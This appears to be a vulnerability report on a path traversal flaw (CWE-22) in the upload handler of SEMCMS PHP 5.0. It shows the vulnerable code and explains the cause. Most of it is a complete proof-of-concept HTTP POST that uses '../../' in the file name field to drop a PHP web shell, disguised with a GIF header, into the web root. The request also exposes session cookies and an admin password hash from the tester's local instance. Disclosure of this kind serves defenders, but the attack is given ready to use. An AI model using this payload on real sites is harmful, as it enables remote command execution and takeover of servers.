Path Traversal Vulnerability (CWE-22)
1. downland_url:https://www.sem-cms.com/TradeCmsdown/php/semcms_php_5.0.zip

2. Path Concatenation**
   The value of `$Imageurl` parameter `../Images/default/` concatenated with the value of `wname` parameter `../../shell`, results in the final storage path:
   `../Images/default/../../shell.jpg` → Equivalent to `../../shell.jpg`.
3. **Directory Traversal Effect**
   Assuming the website root directory is `/var/www/html/`, the final path of the uploaded file would be:
   `/var/www/html/1cj5Mn_Admin/../Images/default/../../shell.jpg` → `/var/www/html/shell.jpg`.

Source Code:

```
// Unfiltered path concatenation 
$Imageurl = $_POST["imageurl"]; // User-controllable 
$newname = test_input($_POST["wname"]) . "." . $ext; // User-controllable 
move_uploaded_file($tmp_name, $Imageurl . $newname);
```

**Cause of Vulnerability:**

- Lack of path normalization for `imageurl` and `wname`.
- No restriction on directory traversal characters (`../`) in user input.

```
POST /1cj5Mn_Admin/SEMCMS_Upfile.php HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Length: 813
Origin: http://127.0.0.1:8000
Connection: keep-alive
Referer: http://127.0.0.1:8000/1cj5Mn_Admin/SEMCMS_Upload.php?Imageurl=../Images/default/&filed=down_file&filedname=form
Cookie: csrftoken=DC1ie5F1GBasnO3BOxBk7lQ26Ee82lQM; _ga_R1FN4KJKJH=GS1.1.1731064454.3.1.1731065715.0.0.0; _ga=GA1.1.1573617850.1730626906; 4411def9d576984c8d78253236b2a62f__typecho_uid=1; 4411def9d576984c8d78253236b2a62f__typecho_authCode=%24T%24B0Y0sei2u2a444450e82362ddf26030b5474ad3c6; PHPSESSID=va4k07vvgftbnhaomq31s87np1; csrf_cookie_name=d9764bb0c2711f0ce2444be389abeb68; xunruicms_527064877b6d641aa8c19449a87beacc=tmuo9h6ga29i2pel1evd7qh8fs9cpbvg; 527064877b6d641aa8c19449a87beacc_member_uid=1; 527064877b6d641aa8c19449a87beacc_member_cookie=2da9437e47038d33a019eac9432349d7; __tins__4329483=%7B%22sid%22%3A%201739256022241%2C%20%22vd%22%3A%202%2C%20%22expires%22%3A%201739257829169%7D; __51cke__=; __51laig__=2; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="wname"

../../shell
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="file"; filename="1.jpg" 

GIF89a;
<?php system($_GET['cmd']); ?>
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="imageurl"

../Images/default/
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="filed"

down_file
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="filedname"

form
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="submit"

Submit
------geckoformboundary7885279eed7384fc280d6248a79275ff--

```
![image](https://github.com/user-attachments/assets/3450a85e-0dd7-4998-b4f3-5b802ae0be32)


![image](https://github.com/user-attachments/assets/5ea6ed85-8ac1-49f7-b087-e5da6d21cef6)
